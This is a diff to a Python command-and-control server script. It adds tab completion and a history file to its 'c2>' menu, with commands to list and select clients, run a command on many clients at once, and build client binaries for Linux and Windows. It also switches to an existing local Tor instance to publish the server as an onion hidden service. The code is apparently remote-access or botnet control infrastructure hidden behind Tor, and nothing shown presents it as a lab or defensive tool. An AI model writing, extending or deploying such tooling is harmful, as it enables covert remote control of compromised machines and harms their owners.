@@ -1,11 +1,15 @@
 #!/usr/bin/env python3
+import atexit
 import base64
 import os
+import readline
 import socket
 import subprocess
 import sys
 import threading
 import time
+
+HISTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".c2_history")
 
 HOST = "0.0.0.0"
 PORT = 1337
@@ -226,7 +230,56 @@ def build_client(target: str):
         print(f"[-] Build failed for {t} (exit code {r.returncode})")
 
 
+def setup_readline(completer):
+    readline.set_completer(completer)
+    readline.set_completer_delims(" \t\n")
+    if hasattr(readline, "read_history_file"):
+        try:
+            readline.read_history_file(HISTFILE)
+        except FileNotFoundError:
+            pass
+    atexit.register(lambda: readline.write_history_file(HISTFILE))
+
+
+def c2_completer(text, state, manager=None):
+    if manager is None:
+        return None
+    CMD2 = {"select", "build"}
+    CMD1 = {"list", "exit"}
+    ALL_CMDS = CMD1 | CMD2 | {"multi_run"}
+    line = readline.get_line_buffer()
+    parts = line.split()
+    if not parts or (len(parts) == 1 and not line.endswith(" ")):
+        prefix = parts[0] if parts else ""
+        candidates = [c for c in ALL_CMDS if c.startswith(prefix)]
+        return candidates[state] if state < len(candidates) else None
+    cmd = parts[0]
+    if line.endswith(" "):
+        if cmd == "select":
+            ids = sorted(manager.list_clients().keys())
+            candidates = [str(i) for i in ids]
+            return candidates[state] if state < len(candidates) else None
+        if cmd == "build":
+            candidates = ["linux", "windows", "linux-musl", "linux32"]
+            return candidates[state] if state < len(candidates) else None
+        return None
+    if cmd in CMD2 and len(parts) == 2:
+        arg = parts[1]
+        if cmd == "select":
+            ids = sorted(manager.list_clients().keys())
+            candidates = [str(i) for i in ids if str(i).startswith(arg)]
+            return candidates[state] if state < len(candidates) else None
+        if cmd == "build":
+            candidates = [t for t in ("linux", "windows", "linux-musl", "linux32") if t.startswith(arg)]
+            return candidates[state] if state < len(candidates) else None
+    return None
+
+
 def c2_menu(manager: ClientManager):
+    def comp(text, state):
+        return c2_completer(text, state, manager)
+    readline.parse_and_bind("tab: complete")
+    setup_readline(comp)
     while True:
         try:
             line = input("c2> ").strip()
@@ -289,46 +342,23 @@ def c2_menu(manager: ClientManager):
             print("Commands: list, select <id>, multi_run <cmd>, build <target>, exit")
 
 
-def start_tor():
-    DATA_DIR = os.path.join(BASE_DIR, "tor_data")
-
-    print("[*] Launching Tor...")
-    proc = subprocess.Popen(
-        [
-            "tor",
-            "--ControlPort", str(CONTROL_PORT),
-            "--SocksPort", str(SOCKS_PORT),
-            "--DataDirectory", DATA_DIR,
-            "--CookieAuthentication", "1",
-        ],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-    )
-
-    def read_stdout():
-        for line in iter(proc.stdout.readline, b""):
-            print(f"[tor] {line.decode(errors='ignore').rstrip()}")
-
-    threading.Thread(target=read_stdout, daemon=True).start()
-
+def connect_tor():
+    print("[*] Connecting to Tor on localhost:9051...")
     from stem.control import Controller
-    for _ in range(60):
-        time.sleep(0.5)
+    for _ in range(30):
         try:
-            controller = Controller.from_port(port=CONTROL_PORT)
+            controller = Controller.from_port(port=9051)
             controller.authenticate()
-            print("[+] Tor launched and authenticated")
+            print("[+] Connected and authenticated to Tor")
             return controller
         except Exception:
-            if proc.poll() is not None:
-                raise RuntimeError(f"Tor exited prematurely (code {proc.returncode})")
+            time.sleep(1)
             continue
-
-    raise RuntimeError("Timed out waiting for Tor control port")
+    raise RuntimeError("Could not connect to Tor on localhost:9051")
 
 
 def create_hidden_service(controller):
-    HS_DIR = os.path.join(BASE_DIR, "hidden_service")
+    HS_DIR = os.path.join(SERVER_CONFIG_DIR, "hidden_service")
     os.makedirs(HS_DIR, exist_ok=True)
     os.chmod(HS_DIR, 0o700)
 
@@ -339,7 +369,7 @@ def create_hidden_service(controller):
     ])
 
     hostname_file = os.path.join(HS_DIR, "hostname")
-    for _ in range(30):
+    for _ in range(60):
         if os.path.exists(hostname_file):
             with open(hostname_file) as f:
                 hostname = f.read().strip()
@@ -364,7 +394,7 @@ def run_c2_server():
     manager = ClientManager()
     threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
     time.sleep(0.3)
-    controller = start_tor()
+    controller = connect_tor()
     hostname = create_hidden_service(controller)
     write_hostname(hostname)
     print()
